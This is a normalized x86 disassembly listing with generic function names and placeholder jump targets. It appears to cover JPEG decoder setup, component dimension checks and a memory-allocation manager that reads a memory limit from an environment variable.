mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_41ed40
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x18
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x190 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_41f1d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_41f610
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_41edb0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] sub_41f1b0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x11 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41edb0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_41ee20
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41f0d0
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x188 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
mov eax [ eax + 0x4 ]
mov [ edx ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ee20
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x124 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x124 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x128 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x1c ]
mov [ eax + 0x138 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0x13c ] edx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x34 ] 0x1
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x38 ] 0x1
mov edx [ ebp - 0x10 ]
mov [ edx + 0x3c ] 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x24 ]
mov [ eax + 0x40 ] edx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x44 ] 0x1
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x10 ]
mov eax [ ecx + 0x20 ]
xor edx edx
div [ esi + 0xc ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1a
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x124 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x1c ] 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x124 ] 0x4
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x140 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x144 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x124 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x110 ]
shl ecx 0x3
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x138 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x114 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
push edx
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x13c ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x140 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x128 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ eax + 0x34 ]
imul edx [ ecx + 0x38 ]
mov eax [ ebp - 0x10 ]
mov [ eax + 0x3c ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ecx + 0x34 ]
imul eax [ edx + 0x24 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov eax [ edx + 0x1c ]
xor edx edx
div [ ecx + 0x34 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x44 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov eax [ eax + 0x20 ]
xor edx edx
div [ ecx + 0x38 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x140 ]
add eax [ ebp - 0x8 ]
cmp eax 0xa
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xd
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x140 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x144 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x140 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x140 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_41f0d0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x124 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x128 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x34
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + eax * 4 + 0x90 ] 0x0
jne r-xdata
push 0x82
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov [ ebp - 0x10 ] eax
push 0x82
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x90 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x4c ] eax
jmp r-xdata
sub_41f1b0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
mov [ ecx ] sub_41f1d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f1d0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x11 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
call [ eax + 0x4 ]
add esp 0x4
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x14 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x10 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41f2f0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x11 ] 0x1
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x14 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41edb0
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x23
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x84 ]
cmp eax [ edx + 0x7c ]
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
xor ecx ecx
mov cl [ eax + 0xd ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x7c ]
mov [ ecx + 0x84 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x3b
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_41f2f0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0xffdc
jg r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x29
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0xffdc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0xffdc
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0xa
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xf
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc0 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc0 ] 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x110 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x114 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x1a
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x1c ] 0xa
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x24 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x118 ] 0x8
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x12
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x8 ] 0x4
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x114 ]
shl edx 0x3
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
call sub_420c70
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x11c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x124 ]
cmp edx [ ecx + 0x24 ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x24 ] 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x110 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x1c ]
imul eax [ edx + 0x8 ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x114 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x20 ]
imul eax [ edx + 0xc ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x110 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x1c ]
imul eax [ edx + 0x8 ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x28 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x114 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x20 ]
imul eax [ edx + 0xc ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x2c ] eax
mov edx [ ebp - 0x8 ]
mov [ edx + 0x30 ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x110 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0xc ] 0x0
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x190 ]
mov [ eax + 0x10 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xc8 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x54
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x114 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x110 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax + 0x114 ]
cmp edx [ ecx + 0xc ]
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x4
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
mov [ edx + 0x10 ] 0x0
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x54
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x114 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax + 0x110 ]
cmp edx [ ecx + 0x8 ]
jle r-xdata
sub_41f610
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_41f1d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x11 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x10 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x194 ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f680
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
xor ecx ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] 0x3b9aca00
cmp [ ebp - 0x10 ] 0x3b9aca00
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x2
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x3
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
xor ecx ecx
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_41f890
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_41faa0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_41fba0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] sub_41fcb0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] sub_41fdd0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] sub_41fe80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] sub_41ff30
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] sub_420210
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] sub_420580
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] sub_420900
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] sub_420ac0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] 0x3b9aca00
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x2c ] eax
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42b360
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x36
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b340
add esp 0x4
mov [ ebp - 0x8 ] eax
push 0x54
mov edx [ ebp + 0x8 ]
push edx
call sub_42b2b0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] 0x54
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
push r--data
call [ getenv@IAT ]
add esp 0x4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x34 ] 0x0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x3c ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] 0x78
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x8 ]
push eax
push r--data
mov ecx [ ebp - 0x14 ]
push ecx
call [ sscanf@IAT ]
add esp 0x10
test eax eax
jle r-xdata
mov ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
movsx edx [ ebp - 0x18 ]
cmp edx 0x6d
je r-xdata
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x3e8
mov [ ebp - 0x8 ] ecx
movsx eax [ ebp - 0x18 ]
cmp eax 0x4d
jne r-xdata
mov edx [ ebp - 0x8 ]
imul edx edx 0x3e8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
sub_41f890
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x10 ] 0x3b9ac9f0
jbe r-xdata
mov eax [ ebp + 0x10 ]
xor edx edx
mov ecx 0x8
div ecx
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
push 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_41fa60
add esp 0x8
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov edx 0x8
sub edx [ ebp - 0x14 ]
mov eax [ ebp + 0x10 ]
add eax edx
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xe
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp + 0xc ] 0x2
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x34 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x8 ]
add edx 0x10
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x4 ]
add eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
sub eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
add edx 0x10
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx * 4 + r--data ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b2b0
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx 0x3b9aca00
sub edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
mov ecx 0x3b9aca00
sub ecx [ ebp - 0x18 ]
cmp [ ebp - 0x1c ] ecx
jbe r-xdata
mov edx [ ebp - 0x1c ]
shr edx 0x1
mov [ ebp - 0x1c ] edx
cmp [ ebp - 0x1c ] 0x32
jae r-xdata
jmp r-xdata
jmp r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa60
add esp 0x8
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4c ]
add eax ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4c ] eax
mov edx [ ebp - 0x8 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp + 0x10 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x34 ] edx
jmp r-xdata
sub_41fa60
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x36
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
